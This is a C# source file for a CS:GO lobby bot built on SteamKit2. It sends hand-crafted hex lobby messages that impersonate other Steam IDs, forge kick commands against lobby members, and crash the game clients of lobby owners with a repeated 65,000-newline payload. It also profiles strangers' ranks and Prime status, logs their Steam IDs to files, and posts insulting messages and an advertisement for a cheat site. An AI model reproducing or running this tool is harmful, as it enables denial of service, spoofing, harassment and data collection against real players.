using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using SteamKit2;
using SteamKit2.Internal;

namespace GodnestCSGOTool
{
    class Handler : ClientMsgHandler
    {
        public class MyCallback : CallbackMsg
        {
            public EResult Result { get; private set; }

            internal MyCallback(EResult res)
            {
                Result = res;
            }
        }
        static public string gmsg = null;
        static public string whoinlobby;
        static public int mysteamid;
        static public string steamid;
        static public string chat1;
        static public string searchstatus;
        static public string fakesteamid;
        static public bool iminlobby = false;
        static public bool imdone = false;
        static public bool istherenahlebs = false;
        static public string checkedlobys = "";
        static public bool needcrashowner = false;
        static public bool needkicknahelb = false;
        static public string reasoncrashowner = "";
        static public string reasonkick = "";

        public void GEtLobbyData()
        {
            var GEtLobbyData = new ClientMsgProtobuf<CMsgClientMMSGetLobbyData>(EMsg.ClientMMSGetLobbyData);
            GEtLobbyData.Header.Proto.routing_appid = 730;
            GEtLobbyData.Body.app_id = 730;
            GEtLobbyData.Body.steam_id_lobby = mainform.lobbyid; // Lobby link 109775243834561419/76561198312797851

            Client.Send(GEtLobbyData);
        }

        public void JoinLobby()
        {
            imdone = false;
            iminlobby = false;
            var JoinLobby = new ClientMsgProtobuf<CMsgClientMMSJoinLobby>(EMsg.ClientMMSJoinLobby);
            JoinLobby.ProtoHeader.routing_appid = 730;
            JoinLobby.Header.Proto.routing_appid = 730;
            JoinLobby.Body.app_id = 730;
            JoinLobby.Body.steam_id_lobby = mainform.lobbyid; // Lobby link 109775243834561419/76561198312797851
            JoinLobby.Body.persona_name = mainform.name;
            Client.Send(JoinLobby);
        }
        async void unlockit()
        {
            for (int i = 0; i < 3; i++)
            {
                await Task.Delay(1000).ConfigureAwait(false);
            }
            LeaveLobby(mainform.lobbyid);
            imdone = true;
        }
        public void JoinLobbyautoulong(ulong lobbyid)
        {
            iminlobby = false;
            var JoinLobby = new ClientMsgProtobuf<CMsgClientMMSJoinLobby>(EMsg.ClientMMSJoinLobby);
            JoinLobby.ProtoHeader.routing_appid = 730;
            JoinLobby.Header.Proto.routing_appid = 730;
            JoinLobby.Body.app_id = 730;
            JoinLobby.Body.steam_id_lobby = lobbyid; // Lobby link 109775243834561419/76561198312797851
            JoinLobby.Body.persona_name = "Name";
            Client.Send(JoinLobby);
        }
        public void LeaveLobby(ulong lobbyid)
        {
            iminlobby = false;
            var LeaveLobby = new ClientMsgProtobuf<CMsgClientMMSLeaveLobby>(EMsg.ClientMMSLeaveLobby);
            LeaveLobby.ProtoHeader.routing_appid = 730;
            LeaveLobby.Header.Proto.routing_appid = 730;
            LeaveLobby.Body.app_id = 730;
            LeaveLobby.Body.steam_id_lobby = lobbyid; // Lobby link 109775243834561419/76561198312797851
            Client.Send(LeaveLobby);
        }

        public void ShatatCSGOCheats()
        {
            var JoinLobby = new ClientMsgProtobuf<CMsgClientMMSJoinLobby>(EMsg.ClientMMSJoinLobby);
            JoinLobby.ProtoHeader.routing_appid = 730;
            JoinLobby.Header.Proto.routing_appid = 730;
            JoinLobby.Body.app_id = 730;
            JoinLobby.Body.steam_id_lobby = mainform.lobbyid; // Lobby link 109775243834561419/76561198312797851
            JoinLobby.Body.persona_name = mainform.name;
            Client.Send(JoinLobby);
        }

        public void createlobby()
        {
            var createlobby = new ClientMsgProtobuf<CMsgClientMMSCreateLobby>(EMsg.ClientMMSCreateLobby);
            createlobby.Header.Proto.routing_appid = 730;
            createlobby.ProtoHeader.routing_appid = 730;
            createlobby.Body.app_id = 730;
            createlobby.Body.persona_name_owner = mainform.name;
            createlobby.Body.max_members = 10;
            createlobby.Body.lobby_type = 1;
            createlobby.Body.lobby_flags = 1;
            Client.Send(createlobby);

        }
        public void SpamMessage()
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            byte[] name = Encoding.Default.GetBytes(mainform.name);
            string namehexstring = (BitConverter.ToString(name)).ToUpper();
            namehexstring = namehexstring.Replace("-", "");
            byte[] message1 = Encoding.Default.GetBytes(mainform.spamessage);
            string message = (BitConverter.ToString(message1)).ToUpper();
            message = message.Replace("-", "");
            string messagesend = "000034FC0053797353657373696F6E3A3A436F6D6D616E64000047616D653A3A43686174000172756E00616C6C0007787569640001100001" + fakesteamid + "016E616D6500" + namehexstring + "00016368617400" + message + "000B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = mainform.lobbyid;
            Client.Send(SendMessage);
        }
        public void InviteMessage(string message2)
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            byte[] message1 = Encoding.UTF8.GetBytes(message2);
            string message = (BitConverter.ToString(message1)).ToUpper();
            message = message.Replace("-", "");
            string messagesend = "000034FC0053797353657373696F6E3A3A436F6D6D616E64000047616D653A3A43686174496E766974654D657373616765000172756E00616C6C0007787569640001100001" + steamid + "07667269656E640001100001" + "00000001" + "01667269656E644E616D6500" + message + "000B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = mainform.lobbyid;
            Client.Send(SendMessage);
        }

        public void KickMsg()
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            string kicksteamid = Convert.ToString(Convert.ToInt32(mainform.kicksteamid), 16).ToUpper();
            bool kick = true;
            while (kick == true)
            {
                if (kicksteamid.Length < 8)
                {
                    kicksteamid = "0" + kicksteamid;
                }
                else
                {
                    kick = false;
                }
            }
            string messagesend = "000034FC0053797353657373696F6E3A3A4F6E506C617965724B69636B65640007787569640001100001" + kicksteamid + "0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = mainform.lobbyid;
            Client.Send(SendMessage);
        }
        public void Kicknahleb(int steamid)
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            string kicksteamid = Convert.ToString(steamid, 16).ToUpper();
            bool kick = true;
            while (kick == true)
            {
                if (kicksteamid.Length < 8)
                {
                    kicksteamid = "0" + kicksteamid;
                }
                else
                {
                    kick = false;
                }
            }
            string messagesend = "000034FC0053797353657373696F6E3A3A4F6E506C617965724B69636B65640007787569640001100001" + kicksteamid + "0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = mainform.lobbyid;
            Client.Send(SendMessage);
        }

        public void sSendMessage()
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            byte[] name = Encoding.Default.GetBytes(mainform.name);
            string namehexstring = (BitConverter.ToString(name)).ToUpper();
            namehexstring = namehexstring.Replace("-", "");
            byte[] message1 = Encoding.Default.GetBytes(mainform.currentmessage);
            string message = (BitConverter.ToString(message1)).ToUpper();
            message = message.Replace("-", "");
            string messagesend = "000034FC0053797353657373696F6E3A3A436F6D6D616E64000047616D653A3A43686174000172756E00616C6C0007787569640001100001" + fakesteamid + "016E616D6500" + namehexstring + "00016368617400" + message + "000B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = mainform.lobbyid;
            Client.Send(SendMessage);
        }
        public void CrashSendMessage()
        {
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            byte[] name = Encoding.Default.GetBytes("Name");
            string namehexstring = (BitConverter.ToString(name)).ToUpper();
            namehexstring = namehexstring.Replace("-", "");
            byte[] message1 = Encoding.Default.GetBytes(new string('\n', 65000));
            string message = (BitConverter.ToString(message1)).ToUpper();
            message = message.Replace("-", "");
            string messagesend = "000034FC0053797353657373696F6E3A3A436F6D6D616E64000047616D653A3A43686174000172756E00616C6C0007787569640001100001" + fakesteamid + "016E616D6500" + namehexstring + "00016368617400" + message + "000B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(messagesend);
            SendMessage.Body.steam_id_lobby = mainform.lobbyid;
            Client.Send(SendMessage);
        }

        public static byte[] StringToByteArray1(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        public static string RemoveControlCharacters(string inString)
        {
            if (inString == null) return null;
            StringBuilder newString = new StringBuilder();
            char ch;
            for (int i = 0; i < inString.Length; i++)
            {
                ch = inString[i];
                if (!char.IsControl(ch))
                {
                    newString.Append(ch);
                }
            }
            return newString.ToString();
        }

        public override void HandleMsg(IPacketMsg packetMsg)
        {
            if (packetMsg.MsgType == EMsg.ClientMMSLobbyChatMsg)
            {
                if (mainform.crashlobby != true)
                {
                    if (mainform.autoparser != true)
                    {
                        var resp = new ClientMsgProtobuf<CMsgClientMMSLobbyChatMsg>(packetMsg);
                        string lobby_message = (BitConverter.ToString(resp.Body.lobby_message)).ToUpper();
                        lobby_message = lobby_message.Replace("-", "");
                        if (lobby_message == "000034FB0053797353657373696F6E3A3A4F6E5570646174650000557064617465000073797374656D00016C6F636B00000B0067616D6500016D6D717565756500736561726368696E67000261707200000000030B0B0B0B")
                        {
                            searchstatus = "Ищем игру....";
                        }
                        string hex = RemoveControlCharacters(System.Text.Encoding.UTF8.GetString(resp.Body.lobby_message)) + "END";
                        string name = getBetween(hex, "name", "chat") + ":";
                        string chat = getBetween(hex, "chat", "END");
                        if (chat != null)
                        {
                            chat1 = name + chat;
                        }
                        resp = null;
                    }
                }
            }

            switch (packetMsg.MsgType)
            {
                case EMsg.ClientMMSJoinLobbyResponse:
                    HandleJoinLobbyResponse(packetMsg);
                    break;
                case EMsg.ClientMMSCreateLobbyResponse: // Handled, die response und schickt unsere IPackets weiter
                    HandleCreateLobbyResponse(packetMsg);
                    break;
                case EMsg.ClientMMSLobbyData: // Handled, die response und schickt unsere IPackets weiter
                    ClientMMSLobbyData(packetMsg);
                    break;
                case EMsg.ClientMMSLobbyChatMsg: // Handled, die response und schickt unsere IPackets weiter
                    ClientMMSLobbyChatMsg(packetMsg);
                    break;
            }
        }

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        public static byte[] KickToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        void HandleJoinLobbyResponse(IPacketMsg packetMsg)
        {
            var JoinResp = new ClientMsgProtobuf<CMsgClientMMSJoinLobbyResponse>(packetMsg); // Packets werden ausgelesen und zugeordnet.
            imdone = false;
            if (mainform.startsearchlobby == true)
            {
                string lobbyschecked = File.ReadAllText("lobbyschecked.txt");
                lobbyschecked = lobbyschecked + mainform.lobbyid + Environment.NewLine;
                File.WriteAllText("lobbyschecked.txt", lobbyschecked);
                if (JoinResp.Body.chat_room_enter_response == 1)
                {
                    for (int di = 0; di < JoinResp.Body.members.Count; di++)
                    {
                        if (JoinResp.Body.members[di].steam_id == mainform.steamid64whotofind)
                        {
                            File.WriteAllText("ifindhim.txt", Convert.ToString(mainform.lobbyid));
                            imdone = true;
                        }
                    }
                    imdone = true;
                }
                imdone = true;
            }
            if (JoinResp.Body.chat_room_enter_response == 1)
            {
                for (int i = 0; i <= JoinResp.Body.members.Count - 1; i++)
                {
                    try
                    {
                        string besedka = File.ReadAllText("steamids.txt") + Environment.NewLine;
                        if (besedka.Contains(Convert.ToString(JoinResp.Body.members[i].steam_id)) != true)
                        {
                            besedka = besedka + JoinResp.Body.members[i].steam_id;
                            File.WriteAllText("steamids.txt", besedka);
                        }
                    }
                    catch (Exception) { }
                }
                iminlobby = true;
                lobby.statusteam = "Зашел в лобби:" + JoinResp.Body.steam_id_lobby;
            }
            else
            {
                LeaveLobby(mainform.lobbyid);
                imdone = true;
                whoinlobby = null;
                try
                {
                    string besedka = File.ReadAllText("badlobbys.txt") + mainform.lobbyid;
                    File.WriteAllText("badlobbys.txt", besedka);
                }
                catch (Exception)
                {
                    File.WriteAllText("badlobbys.txt", Convert.ToString(mainform.lobbyid));
                }
                lobby.statusteam = "Немогу подключиться к лобби";
            }
            mysteamid = Convert.ToInt32(JoinResp.Header.Proto.steamid - 76561197960265728);
            steamid = Convert.ToString(Convert.ToInt32(JoinResp.Header.Proto.steamid - 76561197960265728), 16).ToUpper();

            string wins = Convert.ToString(Convert.ToUInt32(mainform.numbersofwins), 16).ToUpper();
            string rank = Convert.ToString(Convert.ToInt32(mainform.rankid), 16).ToUpper();
            string level = Convert.ToString(Convert.ToInt32(mainform.level), 16).ToUpper();
            bool iswins = true;
            bool islevel = true;
            bool isrank = true;
            while (iswins == true)
            {
                if (wins.Length != 10)
                {
                    wins = "0" + wins;
                }
                else
                {
                    iswins = false;
                }
            }
            while (islevel == true)
            {
                if (level.Length != 10)
                {
                    level = "0" + level;
                }
                else
                {
                    islevel = false;
                }
            }
            while (isrank == true)
            {
                if (rank.Length != 10)
                {
                    rank = "0" + rank;
                }
                else
                {
                    isrank = false;
                }
            }
            byte[] name = Encoding.Default.GetBytes(mainform.name);
            string namehexstring = (BitConverter.ToString(name)).ToUpper();
            namehexstring = namehexstring.Replace("-", "");
            var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
            string goodmessage = "000034FC0053797353657373696F6E3A3A526571756573744A6F696E44617461000769640001100001" + steamid + "0073657474696E677300006D656D6265727300026E756D4D616368696E65730000000001026E756D506C61796572730000000001026E756D536C6F74730000000001006D616368696E6530000769640001100001" + steamid + "07666C616773000000000000000000026E756D506C6179657273000000000107646C636D61736B000000000000000000017475766572003030303030303030000270696E67000000000000706C61796572300007787569640001100001" + steamid + "016E616D6500" + namehexstring + "000067616D650002636C616E494400000000000272616E6B696E67" + rank + "0277696E73" + wins + "026C6576656C" + level + "027870707473001388017401636F6D6D656E6473005B6627105D5B7427105D5B6C27105D00016D6564616C73005B54315D5B43325D5B57305D5B47305D5B41315D00027465616D636F6C6F720000000000027072696D650000000000016C6F63005255000B0B0B076A6F696E666C6167730000000000000000000B077465616D5265734B65790000000000000000000B0B0B";
            SendMessage.ProtoHeader.routing_appid = 730;
            SendMessage.Body.app_id = 730;
            SendMessage.Body.lobby_message = StringToByteArray(goodmessage);
            SendMessage.Body.steam_id_lobby = mainform.lobbyid;
            if (JoinResp.Body.chat_room_enter_response == 1)
            {
                if (mainform.startyowerwatch != true)
                {
                    Client.Send(SendMessage);
                }
                else
                {
                    if (checkedlobys.Contains(Convert.ToString(mainform.lobbyid)) == true)
                    {
                        if (JoinResp.Body.members.Count < 6)
                        {
                            checkedlobys = checkedlobys.Replace(Convert.ToString(mainform.lobbyid), "");
                            LeaveLobby(mainform.lobbyid);
                            imdone = true;
                        }
                        else
                        {
                            if (JoinResp.Body.members.Count > 6)
                            {
                                checkedlobys = checkedlobys.Replace(Convert.ToString(mainform.lobbyid), "");
                                LeaveLobby(mainform.lobbyid);
                                imdone = true;
                            }
                        }
                    }
                    else
                    {
                        if (JoinResp.Body.members.Count >= 6)
                        {
                            lobby.statusteam = "Проверяю лобби:" + mainform.lobbyid;
                            Client.Send(SendMessage);
                            Thread.Sleep(500);
                            if (mainform.startyowerwatch == true)
                            {
                                InviteMessage("Этот бот был куплен Repachino, по всем вопросам ко мне в ВК");
                                InviteMessage("******Здесь может быть ваша реклама*******");
                                InviteMessage("******Хороший леги чит, не одного вак бана shark-hack.ru*******");
                                InviteMessage("Причины кика или краша, ранг ниже MGE, более 150 побед, приват ранг выше 20го или прайм");
                                InviteMessage(Convert.ToString("Всего нахлебов кикнуто:" + File.ReadAllLines("nahlebs.txt").Count()));
                                InviteMessage("Мы проверяем ваше лобби на наличие нахлебников...");
                            }
                        }
                        else
                        {
                            LeaveLobby(mainform.lobbyid);
                            imdone = true;
                        }
                    }
                }
            }
            else
            {
                LeaveLobby(mainform.lobbyid);
                imdone = true;
            }
            if (mainform.autoparser == true)
            {
                if (mainform.startyowerwatch != true)
                {
                    InviteMessage(mainform.textwhenjoin);
                    InviteMessage(mainform.textwhenjoin);
                    InviteMessage(mainform.textwhenjoin);
                    InviteMessage(mainform.textwhenjoin);
                    InviteMessage(mainform.textwhenjoin);
                    InviteMessage(mainform.textwhenjoin);
                }
            }
            if (mainform.autokick == true)
            {
                for (int di = 0; di < JoinResp.Body.members.Count; di++)
                {
                    var SendMessage1 = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
                    string kicksteamid = Convert.ToString(Convert.ToInt32(JoinResp.Body.members[di].steam_id - 76561197960265728), 16).ToUpper();
                    bool kick = true;
                    while (kick == true)
                    {
                        if (kicksteamid.Length < 8)
                        {
                            kicksteamid = "0" + kicksteamid;
                        }
                        else
                        {
                            kick = false;
                        }
                    }
                    string messagesend = "000034FC0053797353657373696F6E3A3A4F6E506C617965724B69636B65640007787569640001100001" + kicksteamid + "0B0B";
                    SendMessage1.ProtoHeader.routing_appid = 730;
                    SendMessage1.Body.app_id = 730;
                    SendMessage1.Body.lobby_message = KickToByteArray(messagesend);
                    SendMessage1.Body.steam_id_lobby = mainform.lobbyid;
                    Client.Send(SendMessage1);
                    Thread.Sleep(100);
                }
            }
            if (mainform.autocrash == true)
            {
                for (int i = 0; i <= 200; i++)
                {
                    CrashSendMessage();
                }
            }
            if (mainform.startyowerwatch != true)
            {
                whoinlobby = String.Format("CS" + JoinResp.Body.members.Count + "CE");
                for (int di = 0; di < JoinResp.Body.members.Count;)
                {
                    whoinlobby = whoinlobby + String.Format("SID" + di + JoinResp.Body.members[di].persona_name + "MID" + di + JoinResp.Body.members[di].steam_id + "EID" + di);
                    di = di + 1;
                }
            }
        }

        void HandleCreateLobbyResponse(IPacketMsg packetMsg)
        {
            var resp = new ClientMsgProtobuf<CMsgClientMMSCreateLobbyResponse>(packetMsg);
        }
        void ClientMMSLobbyData(IPacketMsg packetMsg)
        {
            var resp = new ClientMsgProtobuf<CMsgClientMMSLobbyData>(packetMsg);

        }
        void ClientMMSLobbyChatMsg(IPacketMsg packetMsg)
        {
            if (mainform.startyowerwatch == true)
            {
                var resp = new ClientMsgProtobuf<CMsgClientMMSLobbyChatMsg>(packetMsg);
                string goodinfomate = (BitConverter.ToString(resp.Body.lobby_message)).ToUpper().Replace("-", string.Empty);
                if (goodinfomate.Contains("5265706C794A6F696E44617461"))
                {
                    string whitelist = File.ReadAllText("whitelist.txt");
                    string blacklist = File.ReadAllText("blacklist.txt");
                    istherenahlebs = false;
                    int members = Convert.ToInt32(getBetween(goodinfomate, "6E756D506C617965727300000000", "026E756D536C6F7473"), 16);
                    int steamidofowner = Convert.ToInt32(getBetween(goodinfomate, "07787569640001100001", "016E616D6500"), 16);
                    ulong steamid64owner = Convert.ToUInt64(steamidofowner) + 76561197960265728;
                    if (blacklist.Contains(Convert.ToString(steamid64owner)) == true)
                    {
                        needcrashowner = true;
                        reasoncrashowner = " Ты в черном списке ";
                    }
                    else
                    {
                        if (whitelist.Contains(Convert.ToString(steamid64owner)) != true)
                        {
                            string infoofowner = getBetween(goodinfomate, "077875696400", "016C6F6300") + "END";
                            int ownerrank = Convert.ToInt32(getBetween(infoofowner, "72616E6B696E6700000000", "0277696E7300000000"), 16);
                            int ownerprivaterank = Convert.ToInt32(getBetween(infoofowner, "6C6576656C00000000", "027870707473"), 16);
                            int ownerwins = Convert.ToInt32(getBetween(infoofowner, "77696E7300000000", "026C6576656C"), 16);
                            int ownerprime = Convert.ToInt32(getBetween(infoofowner, "7072696D6500000000", "END"), 16);
                            if (ownerrank <= 13)
                            {
                                if (ownerrank != 0)
                                {
                                    string besedka = File.ReadAllText("nahlebs.txt") + Environment.NewLine;
                                    if (besedka.Contains(Convert.ToString(steamidofowner + 76561197960265728)) != true)
                                    {
                                        File.WriteAllText("nahlebs.txt", Convert.ToString((steamidofowner + 76561197960265728) + Environment.NewLine + File.ReadAllText("nahlebs.txt")));
                                    }
                                    needcrashowner = true;
                                    reasoncrashowner = " Ранг Ниже MGE";
                                }
                            }
                            else
                            {
                                if (ownerprivaterank >= 20)
                                {
                                    string besedka = File.ReadAllText("nahlebs.txt") + Environment.NewLine;
                                    if (besedka.Contains(Convert.ToString(steamidofowner + 76561197960265728)) != true)
                                    {
                                        File.WriteAllText("nahlebs.txt", Convert.ToString((steamidofowner + 76561197960265728) + Environment.NewLine + File.ReadAllText("nahlebs.txt")));
                                    }
                                    needcrashowner = true;
                                    reasoncrashowner = " Приватный ранг выше 20го.";
                                }
                                else
                                {
                                    if (ownerwins >= 150)
                                    {
                                        string besedka = File.ReadAllText("nahlebs.txt") + Environment.NewLine;
                                        if (besedka.Contains(Convert.ToString(steamidofowner + 76561197960265728)) != true)
                                        {
                                            File.WriteAllText("nahlebs.txt", Convert.ToString((steamidofowner + 76561197960265728) + Environment.NewLine + File.ReadAllText("nahlebs.txt")));
                                        }
                                        needcrashowner = true;
                                        reasoncrashowner = " Побед больше 150.";
                                    }
                                    else
                                    {
                                        if (ownerprime == 1)
                                        {
                                            string besedka = File.ReadAllText("nahlebs.txt") + Environment.NewLine;
                                            if (besedka.Contains(Convert.ToString(steamidofowner + 76561197960265728)) != true)
                                            {
                                                File.WriteAllText("nahlebs.txt", Convert.ToString((steamidofowner + 76561197960265728) + Environment.NewLine + File.ReadAllText("nahlebs.txt")));
                                            }
                                            needcrashowner = true;
                                            reasoncrashowner = " Есть прайм.";
                                        }
                                    }
                                }
                            }
                        }
                        else
                        {
                            InviteMessage(String.Format("У вас создатель лобби царь и бог, он в вайтлисте."));
                            Thread.Sleep(300);
                        }
                    }
                    string infoofmembers = getBetween(goodinfomate, "7072696D6500000000", "0B0B0B0B0B0B") + "0B0B0B0B0B0B";
                    for (int i = 0; i <= members - 1; i++)
                    {
                        int steamid = Convert.ToInt32(getBetween(infoofmembers, "07787569640001100001", "016E616D6500"), 16);
                        int privaterank = Convert.ToInt32(getBetween(infoofmembers, "6C6576656C00000000", "027870707473"), 16);
                        int wins = Convert.ToInt32(getBetween(infoofmembers, "77696E7300000000", "026C6576656C"), 16);
                        int prime = Convert.ToInt32(getBetween(infoofmembers, "027072696D6500000000", "016C6F6300"), 16);
                        int rank = Convert.ToInt32(getBetween(infoofmembers, "0272616E6B696E6700000000", "0277696E73"), 16);
                        infoofmembers = getBetween(infoofmembers, "7072696D6500000000", "0B0B0B0B0B0B") + "0B0B0B0B0B0B";
                        ulong steamid64 = Convert.ToUInt64(steamid) + 76561197960265728;
                        if (mysteamid != steamid)
                        {
                            if (blacklist.Contains(Convert.ToString(steamid64)) == true)
                            {
                                Kicknahleb(steamid);
                                InviteMessage(String.Format("Кикнут нахлебник:" + (steamid + 76561197960265728) + " Причина: в черном списке"));
                            }
                            if (needcrashowner == true)
                            {
                                Kicknahleb(steamid);
                            }
                            else
                            {
                                if (whitelist.Contains(Convert.ToString(steamid64)) != true)
                                {
                                    if (rank <= 13)
                                    {
                                        if (rank != 0)
                                        {
                                            istherenahlebs = true;
                                            string besedka = File.ReadAllText("nahlebs.txt") + Environment.NewLine;
                                            if (besedka.Contains(Convert.ToString(steamidofowner + 76561197960265728)) != true)
                                            {
                                                File.WriteAllText("nahlebs.txt", Convert.ToString((steamidofowner + 76561197960265728) + Environment.NewLine + File.ReadAllText("nahlebs.txt")));
                                            }
                                            reasonkick = String.Format("Кикнут нахлебник:" + (steamid + 76561197960265728) + " Причина: Ранг ниже MGE");
                                            needkicknahelb = true;
                                        }
                                    }
                                    else
                                    {
                                        if (privaterank >= 20)
                                        {
                                            istherenahlebs = true;
                                            string besedka = File.ReadAllText("nahlebs.txt") + Environment.NewLine;
                                            if (besedka.Contains(Convert.ToString(steamidofowner + 76561197960265728)) != true)
                                            {
                                                File.WriteAllText("nahlebs.txt", Convert.ToString((steamidofowner + 76561197960265728) + Environment.NewLine + File.ReadAllText("nahlebs.txt")));
                                            }
                                            reasonkick = (String.Format("Кикнут нахлебник:" + (steamid + 76561197960265728) + " Причина: Приватный ранг выше 20го"));
                                            needkicknahelb = true;
                                        }
                                        else
                                        {
                                            if (wins >= 150)
                                            {
                                                istherenahlebs = true;
                                                string besedka = File.ReadAllText("nahlebs.txt") + Environment.NewLine;
                                                if (besedka.Contains(Convert.ToString(steamidofowner + 76561197960265728)) != true)
                                                {
                                                    File.WriteAllText("nahlebs.txt", Convert.ToString((steamidofowner + 76561197960265728) + Environment.NewLine + File.ReadAllText("nahlebs.txt")));
                                                }
                                                reasonkick = (String.Format("Кикнут нахлебник:" + (steamid + 76561197960265728) + " Причина: Побед больше 150"));
                                                needkicknahelb = true;
                                            }
                                            else
                                            {
                                                if (prime == 1)
                                                {
                                                    istherenahlebs = true;
                                                    string besedka = File.ReadAllText("nahlebs.txt") + Environment.NewLine;
                                                    if (besedka.Contains(Convert.ToString(steamidofowner + 76561197960265728)) != true)
                                                    {
                                                        File.WriteAllText("nahlebs.txt", Convert.ToString((steamidofowner + 76561197960265728) + Environment.NewLine + File.ReadAllText("nahlebs.txt")));
                                                    }
                                                    reasonkick = (String.Format("Кикнут нахлебник:" + (steamid + 76561197960265728) + " Причина: Есть прайм"));
                                                    needkicknahelb = true;
                                                }
                                            }
                                        }
                                    }
                                }
                                else
                                {
                                    InviteMessage(String.Format("У вас есть ЦАРЬ в лобби:" + (steamid + 76561197960265728) + " не обижайте его :3"));
                                    Thread.Sleep(300);
                                }
                            }
                            if (needkicknahelb == true)
                            {
                                Kicknahleb(steamid);
                                InviteMessage(reasonkick);
                                needkicknahelb = false;
                            }
                        }
                    }
                    if (needcrashowner == true)
                    {
                        lobby.statusteam = "Тапнул кс бомжу!";
                        Thread.Sleep(500);
                        InviteMessage(String.Format("Ты нахлебник ебучий, причина:" + reasoncrashowner +  ",тапаем ксочку..."));
                        Thread.Sleep(300);
                        for (int i = 0; i <= 200; i++)
                        {
                            CrashSendMessage();
                        }
                        needcrashowner = false;
                    }
                    else
                    {
                        if (istherenahlebs == false)
                        {
                            checkedlobys = checkedlobys + mainform.lobbyid;
                            lobby.statusteam = "Годное лобби!";
                            InviteMessage(String.Format("В вашем лобби нет нахлебников, если к вам кто-то зайдет или вы кого кикнете, я проверю лобби снова.-"));
                            Thread.Sleep(300);
                            InviteMessage(String.Format("Желаем удачного ХвХ!"));
                            Thread.Sleep(300);
                        }
                        else
                        {
                            lobby.statusteam = "Кикнул бомжей!";
                            InviteMessage(String.Format("В вашем лобби были нахлебники, но нечего, мы их кикнули!"));
                            Thread.Sleep(300);
                            InviteMessage(String.Format("Я зайду к вам снова когда у вас будет 5 или более игроков..."));
                            Thread.Sleep(300);
                        }
                    }
                    lobby.statusteam = "Проверенно:" + mainform.lobbyid;
                    LeaveLobby(mainform.lobbyid);
                    imdone = true;
                }
            }
        }
        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            int Start, End;
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }
            else
            {
                return null;
            }
        }
        static public void Exit()
        {
            Thread.Sleep(500);
            Environment.Exit(0);
        }

    }
}
